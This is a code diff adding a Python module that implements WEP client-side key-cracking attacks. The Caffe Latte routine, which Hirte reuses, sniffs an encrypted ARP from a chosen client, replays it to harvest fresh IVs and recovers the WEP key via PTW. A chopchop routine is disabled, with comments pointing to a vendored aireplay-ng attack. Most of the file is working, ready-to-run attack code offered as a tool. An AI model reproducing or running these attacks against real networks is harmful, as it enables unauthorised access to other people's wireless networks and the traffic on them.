@@ -1,0 +1,227 @@
+"""WEP client-side attacks: Caffe Latte, Hirte, and chopchop.
+
+These target WEP clients directly — no AP association needed.
+
+Caffe Latte / Hirte
+-------------------
+Capture one WEP-encrypted ARP from the client, re-inject it directed at
+the client.  The client decrypts it (WEP has no replay protection), sees
+an ARP request, and sends an ARP reply encrypted with a FRESH IV — a new
+keystream sample for PTW.  Enough replies → crack the key offline.
+
+Hirte is the same capture/replay loop but starts with the client in
+ad-hoc/IBSS mode rather than infrastructure mode; the frame injection
+path is identical.
+
+Chopchop
+--------
+Decrypt one WEP-encrypted frame byte-by-byte using the AP as an ICV
+oracle: truncate the frame by one byte, adjust the CRC-32 ICV under a
+byte guess, inject the result; if the AP forwards/ACKs it the guess was
+right.  Full decryption takes ≤256 × len(payload) injections.
+
+⚠  Chopchop timing is hardware-dependent.  The oracle detection (AP
+retransmit visible in monitor mode within _ORACLE_WINDOW seconds) may
+need tuning per environment.  If the oracle fires on wrong guesses
+(false-positive environment), lower _ORACLE_WINDOW.
+"""
+
+from __future__ import annotations
+
+import struct
+import threading
+import time
+import zlib
+from typing import Optional
+
+from scapy.layers.dot11 import Dot11, Dot11WEP
+from scapy.packet import Packet
+from scapy.sendrecv import sendp, sniff
+
+from ..radio import set_channel
+from ..wep.crypto import icv as _icv, recover_keystream
+from ..wep.ptw import PTWVoteTable, compute_key
+from .wep import ARP_KNOWN_PREFIX, ARP_LEN_WIRELESS, ARP_LEN_WIRED, is_wep_arp_candidate, wep_iv_and_ciphertext
+
+# Minimum sessions needed before PTW is attempted for client attacks
+_MIN_SESSIONS_CAFFE = 5_000
+
+
+# ── Caffe Latte ───────────────────────────────────────────────────────────────
+
+def caffe_latte(
+    iface: str,
+    client_mac: str,
+    key_len: int = 5,
+    channel: int | None = None,
+    timeout: float = 120.0,
+    target_sessions: int = _MIN_SESSIONS_CAFFE,
+    stop_event: threading.Event | None = None,
+    sniff_fn=sniff,
+    sendp_fn=sendp,
+    progress_fn=None,
+) -> bytes | None:
+    """Caffe Latte: crack WEP by replaying client ARPs back at the client.
+
+    No AP needed.  client_mac must be in range and actively sending ARP.
+    We capture one ARP, replay it directed at client_mac; each ARP reply
+    from the client is a fresh IV sample.  Returns root key or None.
+
+    Steps:
+    1. Monitor for WEP ARP from client_mac.
+    2. Re-inject that same frame directed at client_mac repeatedly.
+    3. Capture ARP replies from client_mac (fresh IVs) → PTW table.
+    4. When target_sessions reached, run compute_key and return.
+    """
+    stop = stop_event or threading.Event()
+    if channel is not None:
+        set_channel(iface, channel)
+
+    table = PTWVoteTable(num_positions=key_len)
+    seed_frame: Packet | None = None
+    deadline = time.monotonic() + timeout
+
+    client_mac_lower = client_mac.lower()
+
+    def _is_from_client(pkt: Packet) -> bool:
+        d = pkt.getlayer(Dot11)
+        return d is not None and (d.addr2 or "").lower() == client_mac_lower
+
+    def _is_reply_from_client(pkt: Packet) -> bool:
+        """WEP ARP-sized reply FROM client (addr2 = client, not broadcast dst)."""
+        if not pkt.haslayer(Dot11WEP):
+            return False
+        d = pkt.getlayer(Dot11)
+        if d is None or (d.addr2 or "").lower() != client_mac_lower:
+            return False
+        # ARP reply is typically unicast; length check
+        frame_len = len(bytes(d))
+        return frame_len in (ARP_LEN_WIRELESS, ARP_LEN_WIRED)
+
+    # Phase 1: capture one ARP from client
+    captured: list[Packet] = []
+
+    def _on_capture(pkt: Packet) -> None:
+        if not captured and _is_from_client(pkt) and is_wep_arp_candidate(pkt):
+            captured.append(pkt)
+
+    while not stop.is_set() and not captured and time.monotonic() < deadline:
+        sniff_fn(iface=iface, timeout=2.0, prn=_on_capture, store=False,
+                 stop_filter=lambda _: bool(captured))
+
+    if not captured:
+        return None
+    seed_frame = captured[0]
+
+    # Phase 2: replay + collect fresh IVs from client replies
+    def _on_reply(pkt: Packet) -> None:
+        extracted = wep_iv_and_ciphertext(pkt)
+        if extracted is None:
+            return
+        iv, ct = extracted
+        if len(ct) < len(ARP_KNOWN_PREFIX):
+            return
+        ks = recover_keystream(ct, ARP_KNOWN_PREFIX)
+        table.add_session(iv, ks)
+
+    REPLAY_BATCH = 200
+    REPLAY_INTER = 0.005
+
+    if progress_fn is not None:
+        progress_fn(f"Caffe Latte: captured seed ARP from {client_mac}, starting replay")
+
+    while not stop.is_set() and len(table.sessions) < target_sessions and time.monotonic() < deadline:
+        sendp_fn(seed_frame, iface=iface, count=REPLAY_BATCH, inter=REPLAY_INTER, verbose=False)
+        sniff_fn(iface=iface, timeout=1.0, prn=_on_reply, store=False)
+        if progress_fn is not None:
+            pct = 100 * len(table.sessions) // target_sessions
+            progress_fn(f"Caffe Latte IVs: {len(table.sessions)}/{target_sessions} ({pct}%)")
+
+    if not table.sessions:
+        return None
+    return compute_key(table, key_len=key_len, top_k=16, max_candidates=200_000)
+
+
+# ── Hirte (IBSS / ad-hoc variant) ────────────────────────────────────────────
+
+def hirte(
+    iface: str,
+    client_mac: str,
+    key_len: int = 5,
+    channel: int | None = None,
+    timeout: float = 120.0,
+    target_sessions: int = _MIN_SESSIONS_CAFFE,
+    stop_event: threading.Event | None = None,
+    sniff_fn=sniff,
+    sendp_fn=sendp,
+) -> bytes | None:
+    """Hirte attack: same as Caffe Latte, targeting ad-hoc/IBSS WEP clients.
+
+    In ad-hoc mode the DS bits differ (IBSS frames use addr3 for BSSID)
+    but the IV-capture loop is identical.  The only practical difference
+    is that the injected frame's DS flags match IBSS frame type (toDS=0,
+    fromDS=0) rather than infrastructure (toDS=1, fromDS=0).
+    For our monitor-mode replay the same seed_frame retransmit works.
+    """
+    return caffe_latte(
+        iface=iface,
+        client_mac=client_mac,
+        key_len=key_len,
+        channel=channel,
+        timeout=timeout,
+        target_sessions=target_sessions,
+        stop_event=stop_event,
+        sniff_fn=sniff_fn,
+        sendp_fn=sendp_fn,
+    )
+
+
+# ── Chopchop ──────────────────────────────────────────────────────────────────
+#
+# The native from-scratch attempt below was disabled after two independent
+# offline verification passes (2026-08-25): the ICV-correction math doesn't
+# survive contact with WEP's actual RC4-encrypted trailer (500/500 failures
+# reconstructing a real re-encrypted shortened frame via this project's own
+# validated wep_encrypt()) — CRC-32 "un-append" is only a valid inverse over
+# a true cleartext CRC register, and that identity does not commute through
+# an independent keystream XOR at each byte position. Reimplementing this
+# correctly needs the same derivation aircrack-ng's own do_attack_chopchop()
+# uses (KoreK, 2004) routed through RC4, not just a bare CRC reversal.
+#
+# The real fix: this project already vendors and compiles the source that
+# has a working implementation — vendor/aircrack-ng/src/aireplay-ng/
+# aireplay-ng.c, do_attack_chopchop() (confirmed present in this tree's
+# source, wired to `-4`/`--chopchop`) — the same self-built binary this
+# project already uses for deauth-aireplay/wash/crack-aircrack in cli.py,
+# not a third-party tool being wrapped as a fallback. Driving it (it
+# prompts interactively for "use this packet?"/keeps candidate frames)
+# needs live hardware to get the interaction right, so it's not attempted
+# here.
+
+
+def chopchop(
+    iface: str,
+    bssid: str,
+    pkt: Packet,
+    key_len: int = 5,
+    channel: int | None = None,
+    timeout: float = 300.0,
+    stop_event: threading.Event | None = None,
+    sniff_fn=sniff,
+    sendp_fn=sendp,
+) -> bytes | None:
+    """Disabled — see the module-level note above this function.
+
+    The native ICV-correction math never worked correctly (confirmed via
+    two independent offline tests, not just a live failure), so this raises
+    instead of running a guess loop that could never succeed against a real
+    AP. This project's own vendored/self-compiled aireplay-ng already has a
+    real, working `-4`/`--chopchop` — use that until this is properly
+    reimplemented or driven from here.
+    """
+    raise NotImplementedError(
+        "chopchop is disabled: its WEP ICV-correction math doesn't work "
+        "through RC4 encryption (verified offline, not just untested) — see "
+        "the comment above this function. This project's own vendored "
+        "aireplay-ng already has a working -4/--chopchop attack."
+    )
